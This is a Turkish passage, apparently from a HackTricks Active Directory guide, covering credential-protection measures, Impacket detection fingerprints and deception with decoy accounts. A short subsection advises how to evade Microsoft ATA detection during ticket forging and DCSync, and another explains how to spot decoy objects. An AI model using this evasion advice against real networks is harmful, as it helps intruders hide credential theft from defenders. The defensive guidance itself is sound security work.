{{#endref}}

## Some General Defenses

[**Credential'ları nasıl koruyacağınız hakkında daha fazla bilgi edinin.**](../stealing-credentials/credentials-protections.md)

### **Credential Protection için Defensive Measures**

- **Domain Admins Restrictions**: Domain Admins'in yalnızca Domain Controller'lara login olmasına izin verilmesi ve diğer host'larda kullanılmaması önerilir.
- **Service Account Privileges**: Güvenliği korumak için service'ler Domain Admin (DA) privilege'larıyla çalıştırılmamalıdır.
- **Temporal Privilege Limitation**: DA privilege'ları gerektiren task'lerde bu privilege'ların süresi sınırlandırılmalıdır. Bu, şu şekilde gerçekleştirilebilir: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID 2889/3074/3075'i audit edin ve ardından LDAP MITM/relay attempt'lerini engellemek için DC'lerde/client'larda LDAP signing ile LDAPS channel binding'i zorunlu kılın.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity için Protocol-level fingerprinting

Yaygın AD tradecraft'ını tespit etmek istiyorsanız, **yeniden adlandırılmış binary'ler, service name'leri, geçici batch file'ları veya output path'leri** gibi yalnızca operatörün kontrol ettiği artifact'lere güvenmeyin. Meşru Windows client'larının [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC ve WMI traffic'ini nasıl oluşturduğuna ilişkin baseline hazırlayın; ardından operatör `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` veya `ntlmrelayx.py` dosyalarını düzenlese bile kalan **implementation quirk**'lerini arayın.<sup>[[8]](#references)</sup>

- **Kendi baseline'ınızla doğruladıktan sonra high-confidence standalone candidate'ler**:
- `auth_context_id = 79231 + ctx_id` kullanan authenticated DCE/RPC
- `0xff` ile doldurulmuş DCE/RPC authentication padding
- Raw Kerberos `AP-REQ` değerini doğrudan SPNEGO `mechToken` içine yerleştiren LDAP Kerberos bind'leri
- ASCII benzeri `ClientGuid` değerlerine sahip SMB2/3 negotiate request'leri
- Standard dışı `//./root/cimv2` namespace'ini kullanan WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce değerleri
- **Correlation/scoring feature olarak kullanılması daha uygun olanlar**:
- Sparse veya duplicate Kerberos etype listeleri, olağandışı/eksik `PA-DATA` ya da native Windows'tan farklı TGS-REQ etype sıralaması
- Version info içermeyen NTLM Type 1 message'ları veya null host name içeren Type 3 message'ları
- SPNEGO yerine DCE/RPC içinde taşınan raw NTLMSSP, eksik DCE/RPC verification trailer'ları veya SPNEGO/Kerberos OID mismatch'leri
- Aynı host/user/session/time window'dan gelen bu özelliklerin birkaçı, tek bir zayıf field'dan çok daha güçlüdür
- **Standalone alert yerine enrichment olarak kullanın**:
- Default filename'ler, output path'leri, random service name'leri, temporary batch name'leri, default computer account name'leri ve tool-specific HTTP/WebDAV/RDP/MSSQL string'leri
- Bunların operatörler tarafından değiştirilmesi kolaydır; cross-protocol cluster'ın neden şüpheli olduğunu açıklamak için en iyi şekilde kullanılırlar
- **Operational notes**:
- Bu signal'ların bazıları decrypted traffic, [PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW veya service-side visibility gerektirir
- Alert'lere dönüştürmeden önce Samba/Linux client'ları, appliance'leri ve legacy software'ı baseline'ınızla doğrulayın
- Baseline'a olan güveninizi artırdıkça detection'ları enrichment -> hunting -> alerting aşamalarında ilerletin

### **Deception Techniques'in uygulanması**

- Deception uygulamak; password'ları expire olmayan veya Trusted for Delegation olarak işaretlenmiş decoy user ya da computer'lar gibi trap'ler kurmayı içerir. Ayrıntılı bir yaklaşım, belirli haklara sahip user'lar oluşturmayı veya bunları high privilege group'lara eklemeyi kapsar.<sup>[[2]](#references)</sup>
- Pratik bir örnek olarak şu araçlar kullanılabilir: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception techniques'in deploy edilmesi hakkında daha fazla bilgiye [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) adresinden ulaşılabilir.

### **Deception'ın belirlenmesi**

- **User Object'leri için**: Şüpheli indicator'lar arasında alışılmadık ObjectSID, seyrek logon'lar, creation date'leri ve düşük bad password count değerleri bulunur.
- **General Indicators**: Potential decoy object'lerin attribute'larını gerçek object'lerinkilerle karşılaştırmak inconsistency'leri ortaya çıkarabilir. [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) gibi araçlar bu deception'ları belirlemeye yardımcı olabilir.

### **Detection System'lerini bypass etme**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection'ını önlemek için Domain Controller'larda session enumeration'dan kaçının.
- **Ticket Impersonation**: Ticket oluştururken **aes** key'lerini kullanmak, NTLM'e downgrade yapılmasını önleyerek detection'dan kaçmaya yardımcı olur.
- **DCSync Attacks**: ATA detection'ından kaçınmak için işlemlerin Domain Controller olmayan bir host'tan gerçekleştirilmesi önerilir; doğrudan bir Domain Controller'dan gerçekleştirilmesi alert'leri tetikler.

## References

- [1] [Domain Trust'larına Saldırı Rehberi](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory'de Deception için Trust'ları Forging Etme](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin'den Enterprise Admin'e](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory Exploitation için In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hash'lerini Wordlist Olarak Weaponize Etme](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket'ı Dissect Etme](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Netlogon üzerinden Active Directory Account'larını Ele Geçirme](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 ile ilişkili Netlogon secure channel connection değişikliklerini yönetme](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [Unutulmuş Null Session ve MS-RPC Interface'lerine Bir Yolculuk](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID filter domain'ler arasında security boundary olarak kullanılabilir mi? (Bölüm 4) - SID filtering bypass araştırması](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID filter domain'ler arasında security boundary olarak kullanılabilir mi? (Bölüm 5) - Golden GMSA trust attack - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID filter domain'ler arasında security boundary olarak kullanılabilir mi? (Bölüm 6) - Schema change trust attack - child'dan parent'a](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 ile DA'dan EA'ya](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS abuse ederek child domain admin'lerinden enterprise admin'lerine 5 dakikada escalation, devam yazısı](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [An ACE Up the Sleeve: Active Directory DACL Backdoor'larını Tasarlama](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
{{#include ../../banners/hacktricks-training.md}}
